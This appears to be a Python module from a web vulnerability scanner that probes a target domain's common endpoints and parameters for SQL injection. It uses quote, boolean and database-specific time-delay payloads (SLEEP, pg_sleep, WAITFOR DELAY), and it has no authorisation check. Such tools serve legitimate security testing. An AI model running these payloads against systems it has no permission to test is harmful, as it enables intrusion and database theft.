"""
TraceFoundry V8 - SQL Injection Scanner (Anti-FP Enhanced)
Integrates: baseline_engine, confirm_engine, diff_engine,
            time_sync, error_signature, context_injector, waf_interceptor
"""
import urllib.request, urllib.error, urllib.parse, time
from utils.display import section, ok, warn, info, bug_found
from core.baseline_engine import get_baseline_engine
from core.confirm_engine  import get_confirm_engine
from core.antifp_engines  import (get_diff_engine, get_time_sync,
                                   get_error_sig_db, get_waf_interceptor,
                                   get_param_discovery)

ENDPOINTS = ["/","/search","/api/search","/api/v1/search","/products",
             "/articles","/news","/user","/profile","/api/user",
             "/api/v1/user","/login","/items","/comments","/posts"]

PARAMS = ["id","page","cat","uid","user_id","item","product","article",
          "post","q","query","search","s","type","order","sort","ref"]

class SQLiModule:
    def __init__(self, domain, timeout=6):
        self.domain    = domain
        self.timeout   = timeout
        self.baseline  = get_baseline_engine(timeout)
        self.confirm   = get_confirm_engine(timeout)
        self.diff      = get_diff_engine()
        self.time_sync = get_time_sync(timeout+2)
        self.error_db  = get_error_sig_db()
        self.waf       = get_waf_interceptor()
        self.param_dis = get_param_discovery(timeout)

    def _fetch(self, url, post_data=None):
        h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        try:
            req = urllib.request.Request(url, data=post_data, headers=h)
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body = r.read(65536).decode("utf-8", errors="ignore")
                return body, r.status, dict(r.headers)
        except urllib.error.HTTPError as e:
            try:    body = e.read(32768).decode("utf-8", errors="ignore")
            except: body = ""
            return body, e.code, dict(e.headers)
        except: return "", 0, {}

    def _test_error(self, url, param, bl):
        bugs = []
        body_clean, s_clean, h_clean = self._fetch(f"{url}?{param}=normal123")
        if self.waf.should_skip(s_clean, body_clean, h_clean):
            info(f"    WAF block on {url}?{param} — skip"); return bugs
        error_pats = list({p for ps in self.error_db.SIGNATURES.values() for p in ps})
        confirmed, evidence = self.confirm.confirm_error_sqli(url, param, error_pats)
        if confirmed:
            body_attack, _, _ = self._fetch(f"{url}?{param}='")
            if self.error_db.is_false_positive(body_clean, body_attack):
                info(f"    FP filtered baseline error on {param}"); return bugs
            db, pat = self.error_db.detect(body_attack)
            bugs.append({"type":"SQL Injection (Error-Based) — Triple Confirmed",
                "severity":"CRITICAL","url":f"{url}?{param}='","param":param,
                "database":db or "Unknown","evidence":f"DB error: {pat}",
                "detail":f"Triple-confirmed SQLi on '{param}'",
                "impact":"Database read/dump possible"})
            bug_found("SQL INJECTION — TRIPLE CONFIRMED","CRITICAL",{
                "URL":f"{url}?{param}='","Param":param,"Database":db or "?",
                "Impact":"Full DB access — report immediately!"})
        return bugs

    def _test_boolean(self, url, param, bl):
        bugs = []
        avg = int(bl.get("len_avg",0))
        if avg == 0: return bugs
        confirmed, ev = self.confirm.confirm_boolean_sqli(url, param, avg)
        if confirmed:
            bugs.append({"type":"SQL Injection (Boolean-Blind) — Triple Confirmed",
                "severity":"CRITICAL","url":f"{url}?{param}=1' AND '1'='1",
                "param":param,"evidence":str(ev),
                "detail":f"Boolean blind SQLi on '{param}'",
                "impact":"Blind data extraction"})
            bug_found("BOOLEAN SQLi CONFIRMED","CRITICAL",{
                "URL":url,"Param":param,"Impact":"Blind data extraction"})
        return bugs

    def _test_time(self, url, param, bl):
        bugs = []
        payloads = [
            ("MySQL",      f"{url}?{param}=1'; SELECT SLEEP(4)--",       4),
            ("PostgreSQL", f"{url}?{param}=1'; SELECT pg_sleep(4)--",    4),
            ("MSSQL",      f"{url}?{param}=1'; WAITFOR DELAY '0:0:4'--", 4),
        ]
        for db, test_url, delay in payloads:
            t0 = time.time()
            body, status, headers = self._fetch(test_url)
            elapsed = time.time() - t0
            if self.waf.should_skip(status, body, headers): continue
            if self.time_sync.is_delay_significant(url, elapsed, delay):
                t1 = time.time()
                self._fetch(test_url)
                elapsed2 = time.time() - t1
                if self.time_sync.is_delay_significant(url, elapsed2, delay):
                    bugs.append({"type":f"SQLi Time-Based ({db}) — Jitter-Compensated",
                        "severity":"CRITICAL","url":test_url,"param":param,
                        "database":db,"evidence":f"Delay {elapsed:.1f}s + {elapsed2:.1f}s",
                        "detail":f"Time-based blind SQLi on '{param}'",
                        "impact":"Blind DB extraction"})
                    bug_found(f"TIME-BASED SQLi ({db})","CRITICAL",{
                        "URL":test_url,"Param":param,
                        "Delay 1":f"{elapsed:.1f}s","Delay 2":f"{elapsed2:.1f}s"})
                    break
        return bugs

    def run(self):
        section("SQL Injection V8 (Error|Boolean|Time + Anti-FP Engines)")
        all_bugs = []
        for ep in ENDPOINTS:
            for scheme in ["https","http"]:
                base = f"{scheme}://{self.domain}{ep}"
                _, status, _ = self._fetch(base)
                if status == 0: continue
                info(f"Testing: {base}")
                bl = self.baseline.build(base, n=3)
                extra = self.param_dis.fuzz_params(base,"",int(bl.get("len_avg",0)))
                params = list(dict.fromkeys(PARAMS[:8]+[p["param"] for p in extra[:4]]))
                for param in params:
                    bugs = self._test_error(base, param, bl); all_bugs.extend(bugs)
                    if bugs: continue
                    bugs = self._test_boolean(base, param, bl); all_bugs.extend(bugs)
                    if bugs: continue
                    if params.index(param) < 3:
                        bugs = self._test_time(base, param, bl); all_bugs.extend(bugs)
                break
        seen = set()
        deduped = [b for b in all_bugs if (b.get("url","")+b.get("param","")) not in seen
                   and not seen.add(b.get("url","")+b.get("param",""))]
        info(f"SQLi done — {len(deduped)} confirmed (Anti-FP applied)")
        if not deduped: ok("No SQLi found (triple-verified) ✓")
        return {"bugs": deduped}
